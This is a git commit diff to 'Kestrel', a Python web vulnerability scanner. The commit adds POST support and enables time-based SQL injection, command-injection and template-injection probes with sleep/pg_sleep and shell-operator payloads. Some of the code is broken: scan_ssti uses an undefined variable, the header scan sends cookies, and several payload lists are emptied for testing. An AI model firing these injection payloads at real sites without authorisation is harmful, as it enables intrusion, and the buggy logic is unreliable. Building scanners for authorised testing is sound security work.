e74c855ed4ddf873cddced0593acb0840b033a60
xifeng2009 <takurlif3000@gmail.com>
2022-05-06 14:21:54 +0800

    2022050601 add scans

--- _kestrel.py
+++ _kestrel.py
@@ -1,16 +1,16 @@
 #!/usr/bin/python3
-import sys
-
 USAGE = '''
 Examples:
-#0. Bulkfile (GET)
+#0. Bulkfile (Only work with GET)
 kestrel -m <filename>
 #1. GET
 kestrel -u <url>
+#2. POST
+kestrel -u <url> -d/--data <data>
 #3. Cookie inject
 kestrel -u <url> -c "session=whatthefuckINJECT"
 '''
-import requests, time, re, random, string, copy, argparse
+import sys, requests, time, re, random, string, copy, argparse
 from colorama import init, Fore, Back, Style
 init()
 
@@ -20,10 +20,15 @@ BOOLEAN_BASED_SQL = [{True: i % (R, R), False: i % (R, R-1)} for i in ("' AND %d
 TIME_BASED_SQL = ("' AND (SELECT sleep(10))-- -", "' AND (SELECT sleep(10))#", "' ||pg_sleep(10)-- -", "' ||pg_sleep(10)#", ' AND (SELECT sleep(10))-- -', ' AND (SELECT sleep(10))#', ' ||pg_sleep(10)-- -', ' ||pg_sleep(10)#', '" AND (SELECT sleep(10))-- -', '" AND (SELECT sleep(10))#', '" ||pg_sleep(10)-- -', '" ||pg_sleep(10)#', ') AND (SELECT sleep(10))-- -', ') AND (SELECT sleep(10))#', ') ||pg_sleep(10)-- -', ') ||pg_sleep(10)#', "') AND (SELECT sleep(10))-- -", "') AND (SELECT sleep(10))#", "') ||pg_sleep(10)-- -", "') ||pg_sleep(10)#", '") AND (SELECT sleep(10))-- -', '") AND (SELECT sleep(10))#', '") ||pg_sleep(10)-- -', '") ||pg_sleep(10)#')
 ERROR_BASED_RCE = [i % (R, R) for i in (';expr %d + %d', ';%d + %d', '&&expr %d + %d', '&&%d + %d', '|expr %d + %d', '|%d + %d', '||expr %d + %d', '||%d + %d', '`expr %d + %d`', '`%d + %d`', '$((expr %d + %d))', '$((%d + %d))', )]
 ERROR_BASED_RCE+= [i % (R, R) for i in (';eval("%d+%d")', '&&eval("%d+%d")', '||eval("%d+%d")', '|eval("%d+%d")', )]
-TIME_BASED_RCE  = ["||ping -c 10 127.0.0.1||",]
+TIME_BASED_RCE  = ["||sleep 10||",]
 SSTI = [i % (R, R) for i in ('${%d*%d}', '{{%d*%d}}', '{{%d*\'%d\'}}',)]
 SCAN_TYPES = ['ERROR_BASED_SQL', 'BOOLEAN_BASED_SQL', 'TIME_BASED_SQL', 'ERROR_BASED_RCE', 'TIME_BASED_RCE']
 INJECT, NOSCAN = 'INJECT', 'NOSCAN'
+
+BOOLEAN_BASED_SQL = [] # TEST
+TIME_BASED_SQL  = [] # TEST
+ERROR_BASED_RCE = [] # TEST
+TIME_BASED_RCE  = [] # TEST
 
 SQL_ERROR_BASED_ERRORS = {
     "Python":               (r"Internal Server Error",),
@@ -42,6 +47,7 @@ def parser():
     parser.add_argument('-u', '--url', type=str, help='REQUEST URL, INSERT KEYWORD <INJECT> FOR TEST (e.g. -u http://target.com/?id=INJECT&cid=INJECT')
     parser.add_argument('-m', '--bulkfile', type=str, help='SCAN MULTIPLE TARGETS GIVEN IN A TEXTUAL FILE') # starts with http:// or https://
     # 首先检查url header cookie中是否存在关键字INJECT, 如不存在,进行常规测试, 如存在,进行指定测试
+    parser.add_argument('-d', '--data', type=str, default='', help='POST DATA')
     parser.add_argument('--headers', type=str, default='', help='REQUEST HEADERS (e.g. User-Agent: _______\nReferer: ________')
     parser.add_argument('--cookies', type=str, default='', help='REQUEST COOKIES')
     parser.add_argument('-p', '--proxies', type=str, help='PROXY SERVER (e.g. http://127.0.0.1:8080')
@@ -94,10 +100,12 @@ class Kestrel:
         self.s.proxies.update(self.proxies)
         self.print_ok()
 
-    def find_param_from_url(self, url):
+    def find_param_from_url_or_data(self, url_or_data):
         data = []
-        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):
+        self.param_base = {}
+        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url_or_data):
             data.append(('url', match.group('parameter'), match.group('value')))
+            self.param_base[match.group('parameter')] = match.group('value')
         if self.cookies:
             for k, v in self.cookies.items():
                 data.append(('cki', k, v))
@@ -106,76 +114,100 @@ class Kestrel:
                 data.append(('hdr', k, v))
         return data
 
-    def get(self, url, params={}, cookies={}, headers={}):
+    def get_or_post(self, url, params={}, cookies={}, headers={}):
+        _params = copy.deepcopy(self.param_base)
+        _params.update(params)
         try:
             if cookies:
                 self.s.cookies.update(cookies)
             if headers:
                 self.s.headers.update(headers)
-            r = self.s.get(url, params=params)
+            r = self.s.get(url, params=_params) if not is_post else self.s.post(url, data=_params)
             # reset
             self.s.cookies.update(self.cookies)
             self.s.headers.update(self.headers)
-            # time.sleep(0.3)
             return r
         except requests.exceptions.RequestException as e:
             print(f"[!] Request Exception: {e}")
         except KeyboardInterrupt:
             sys.exit(0)
 
-    def scan_error_based_sql(self, url, pos, k, v):
+    def scan_error_based_sql(self, url, pos, k, v, p):
         if pos == 'url':
-            html = self.get(url, params={k: v}).text
+            html = self.get_or_post(url, params={k: v+p}).text
         if pos == 'cki':
-            html = self.get(url, cookies={k: v}).text
+            html = self.get_or_post(url, cookies={k: v+p}).text
         if pos == 'hdr':
-            html = self.get(url, headers={k: v}).text
+            html = self.get_or_post(url, headers={k: v+p}).text
         for tech, errs in SQL_ERROR_BASED_ERRORS.items():
             for err in errs:
                 if re.search(err, html, re.I):
                     self.vulnerable = True
-                    return self.print_info(url, k, v, 'Error Based SQL Injection')
+                    return self.print_info(url, k, v+p, 'Error Based SQL Injection')
 
     def scan_boolean_based_sql(self, url, pos, k, v, p):
         v_true, v_false = v+p[True], v+p[False]
         if pos == 'url':
-            r1 = self.get(url, params={k: v_true})
-            r2 = self.get(url, params={k: v_false})
+            r1 = self.get_or_post(url, params={k: v_true})
+            r2 = self.get_or_post(url, params={k: v_false})
         if pos == 'cki':
-            r1 = self.get(url, cookies={k: v_true})
-            r2 = self.get(url, cookies={k: v_false})
+            r1 = self.get_or_post(url, cookies={k: v_true})
+            r2 = self.get_or_post(url, cookies={k: v_false})
         if pos == 'hdr':
-            r1 = self.get(url, cookies={k: v_true})
-            r2 = self.get(url, cookies={k: v_true})
+            r1 = self.get_or_post(url, cookies={k: v_true})
+            r2 = self.get_or_post(url, cookies={k: v_true})
         if r1.status_code == r2.status_code == 200 and len(r1.text) != len(r2.text):
             self.vulnerable = True
             return self.print_info(url, k, v_true, 'Boolean Based SQL Injection')
 
-    # def scan_time_based_sql(self):
-    #     stt = time.time()
-    #     r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
-    #     cst = time.time() - stt
-    #     if cst >= 9:
-    #         self.vulnerable = True
-    #         return self._print_info('Time Based SQL Injection')
+    def scan_time_based_sql(self, url, pos, k, v, p):
+        stt = time.time()
+        if pos == 'url':
+            r = self.get_or_post(url, params={k: v+p})
+        if pos == 'cki':
+            r = self.get_or_post(url, cookies={k: v+p})
+        if pos == 'hdr':
+            r = self.get_or_post(url, headers={k: v+p})
+        cst = time.time() - stt
+        if cst >= 9:
+            self.vulnerable = True
+            return self.print_info(url, k, v+p, 'Time Based SQL Injection')
 
-    # def scan_error_based_rce(self):
-    #     r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
-    #     if re.search(self.mark, r.text):
-    #         return self._print_info('Error Based RCE')
+    def scan_error_based_rce(self, url, pos, k, v, p):
+        mark_plus = str(R + R)
+        if pos == 'url':
+            r = self.get_or_post(url, params={k: v+p})
+        if pos == 'cki':
+            r = self.get_or_post(url, cookies={k: v+p})
+        if pos == 'hdr':
+            r = self.get_or_post(url, headers={k: v+p})
+        if re.search(mark_plus, r.text):
+            self.vulnerable = True
+            return self.print_info(url, k, v+p, 'Error Based RCE')
 
-    # def scan_time_based_rce(self):
-    #     stt = time.time()
-    #     r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
-    #     cst = time.time() - stt
-    #     if cst >= 9:
-    #         self.vulnerable = True
-    #         return self._print_info('Time Based RCE')
+    def scan_time_based_rce(self, url, pos, k, v, p):
+        stt = time.time()
+        if pos == 'url':
+            r = self.get_or_post(url, params={k: v+p})
+        if pos == 'cki':
+            r = self.get_or_post(url, cookies={k: v+p})
+        if pos == 'hdr':
+            r = self.get_or_post(url, headers={k: v+p})
+        cst = time.time() - stt
+        if cst > 9:
+            self.vulnerable = True
+            return self.print_info(url, k, v+p, 'Time Based RCE')
 
-    # def scan_ssti(self):
-    #     r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
-    #     if re.search(self.mark2, r.text):
-    #         return self._print_info('SSTI')
+    def scan_ssti(self, url, pos, k, v, p):
+        mark_multi = str(R * R)
+        if pos == 'url':
+            r = self.get_or_post(url, params={k: v + p})
+        if pos == 'cki':
+            r = self.get_or_post(url, cookies={k: v + p})
+        if pos == 'hdr':
+            r = self.get_or_post(url, headers={k: v + p})
+        if re.search(mark_, r.text):
+            return self.print_info(url, k, v+p, 'SSTI')
 
 
     def start(self):
@@ -184,7 +216,8 @@ class Kestrel:
             print(f"[*] Testing {url}")
             ur_ = url.split('?')[0]
             self.vulnerable = False
-            for pos, param, value in self.find_param_from_url(url):
+            url_or_data = url if not is_post else data
+            for pos, param, value in self.find_param_from_url_or_data(url_or_data):
                 if self.vulnerable: break
                 for i in scan_types:
                     typE, payloads = i, eval(i)
@@ -192,18 +225,19 @@ class Kestrel:
                     for payload in payloads:
                         if self.vulnerable: break
                         if typE == 'ERROR_BASED_SQL':
-                            self.scan_error_based_sql(ur_, pos, param, value+payload)
+                            self.scan_error_based_sql(ur_, pos, param, value, payload)
                         elif typE == 'BOOLEAN_BASED_SQL':
                             self.scan_boolean_based_sql(ur_, pos, param, value, payload)
-                        # elif typE == 'TIME_BASED_SQL':
-                        #     pass
-                        # elif typE == 'ERROR_BASED_RCE':
-                        #     pass
-                        # elif typE == 'TIME_BASED_RCE':
-                        #     pass
-
-
-
+                        elif typE == 'TIME_BASED_SQL':
+                            self.scan_time_based_sql(ur_, pos, param, value, payload)
+                        elif typE == 'ERROR_BASED_RCE':
+                            self.scan_error_based_rce(ur_, pos, param, value, payload)
+                        elif typE == 'TIME_BASED_RCE':
+                            self.scan_time_based_rce(ur_, pos, param, value, payload)
+                        elif typE == 'SSTI':
+                            self.scan_ssti(ur_, pos, param, value, payload)
+                        else:
+                            print("todo://add more vulns")
 
 ap = parser()
 args = ap.parse_args()
@@ -216,12 +250,12 @@ if args.bulkfile:
     with open(args.bulkfile, 'r') as f:
         for line in f.readlines():
             urls.append(line.strip('\r').strip('\n'))
+data = args.data
+is_post = True if data else False
 proxies = {'http': args.proxies, 'https': args.proxies}
 scan_types = args.scan if args.scan else SCAN_TYPES
 output = args.output
 
-
-k = Kestrel(args.cookies, args.headers, proxies)
-k.start()
+Kestrel(args.cookies, args.headers, proxies).start()
 
 
